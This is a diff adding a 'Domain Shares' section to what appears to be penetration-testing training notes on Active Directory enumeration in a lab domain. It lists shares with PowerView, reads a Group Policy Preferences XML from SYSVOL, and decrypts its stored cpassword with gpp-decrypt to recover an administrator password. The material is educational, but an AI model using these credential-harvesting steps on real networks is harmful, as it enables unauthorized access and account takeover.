@@ -2014,6 +2014,106 @@ The first SID belongs to the Domain Admins group and the GenericAll permission c
 
 This finding is significant and indicates that stephanie is a powerful account.
 
+#### Domain Shares
+
+Domain shares often contain critical information about the environment, which you can use to your advantage.
+
+```powershell
+PS C:\Tools> Find-DomainShare
+
+Name           Type Remark                 ComputerName
+----           ---- ------                 ------------
+ADMIN$   2147483648 Remote Admin           DC1.corp.com
+C$       2147483648 Default share          DC1.corp.com
+IPC$     2147483651 Remote IPC             DC1.corp.com
+NETLOGON          0 Logon server share     DC1.corp.com
+SYSVOL            0 Logon server share     DC1.corp.com
+ADMIN$   2147483648 Remote Admin           web04.corp.com
+backup            0                        web04.corp.com
+C$       2147483648 Default share          web04.corp.com
+IPC$     2147483651 Remote IPC             web04.corp.com
+ADMIN$   2147483648 Remote Admin           FILES04.corp.com
+C                 0                        FILES04.corp.com
+C$       2147483648 Default share          FILES04.corp.com
+docshare          0 Documentation purposes FILES04.corp.com
+IPC$     2147483651 Remote IPC             FILES04.corp.com
+Tools             0                        FILES04.corp.com
+Users             0                        FILES04.corp.com
+Windows           0                        FILES04.corp.com
+ADMIN$   2147483648 Remote Admin           client74.corp.com
+C$       2147483648 Default share          client74.corp.com
+IPC$     2147483651 Remote IPC             client74.corp.com
+ADMIN$   2147483648 Remote Admin           client75.corp.com
+C$       2147483648 Default share          client75.corp.com
+IPC$     2147483651 Remote IPC             client75.corp.com
+sharing           0                        client75.corp.com
+```
+
+In this example, you'll focus on `SYSVOL`, as it may include files and folder that reside on the DC itself. This share is typically used for various domain policies and scripts. By default, the `SYSVOL` folder is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the DC and every domain user has access to it.
+
+```powershell
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+
+    Directory: \\dc1.corp.com\sysvol\corp.com
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:11 AM                Policies
+d-----          9/2/2022   4:08 PM                scripts
+```
+
+During an assessment, you should investigate every folder you discover in search of interesting items. For now, examine the `Policies` folder:
+
+```powershell
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\
+
+    Directory: \\dc1.corp.com\sysvol\corp.com\Policies
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:13 AM                oldpolicy
+d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
+d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
+```
+
+You find a file named `old-policy-backup.xml`:
+
+```powershell
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+          name="Administrator (built-in)"
+          image="2"
+          changed="2012-05-03 11:45:20"
+          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+    <Properties
+          action="U"
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+          changeLogon="0"
+          noChange="0"
+          neverExpires="0"
+          acctDisabled="0"
+          userName="Administrator (built-in)"
+          expires="2016-02-10" />
+  </User>
+</Groups>
+```
+
+Historically, system administrators often changed local workstation passwords through [Group Policy Preferences (_GPP_)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)).
+
+However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on [MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2). You can use this key to decrypt these encrypted passwords. In this case, you'll use the [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) ruby script.
+
+```bash
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+```
+
+Don't forget to take a look at other interesting files on the share.
+
 ### SharpView
 
 Many of the same functions supported by PowerView can be used with SharpView. You can type a method name with ```-Help``` to get an argument list.
